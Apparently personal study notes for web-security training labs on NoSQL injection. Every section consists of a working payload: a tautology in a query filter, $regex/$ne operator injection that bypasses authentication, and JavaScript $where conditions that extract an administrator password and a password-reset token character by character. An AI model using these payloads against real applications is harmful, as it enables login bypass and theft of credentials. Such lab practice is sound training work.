# NoSQL Injection 

## Lab: Detecting NoSQL injection

```
GET /filter?category=Accessories'||'1'=='1 
```
 
## Lab: Exploiting NoSQL operator injection to bypass authentication
 
```
{"username":{"$regex":"ad.*"},"password":{"$ne":""}}
```

## Lab: Exploiting NoSQL injection to extract data
 
```
GET /user/lookup?user=administrator' %26%26 this.password[0] == 'a' || '1'=='2 HTTP/2
```

## Lab: Exploiting NoSQL operator injection to extract unknown fields

obtener la clave
```
{"username":"carlos","password":{"$ne":""}, 	
"$where":"Object.keys(this)[1].match('^.{1}a.*')"
}	  
```

obtener el valor 
```
{"username":"carlos","password":{"$ne":""}, 	
"$where":"this.passwordReset.match('^.{1}a.*')"
}
```

 




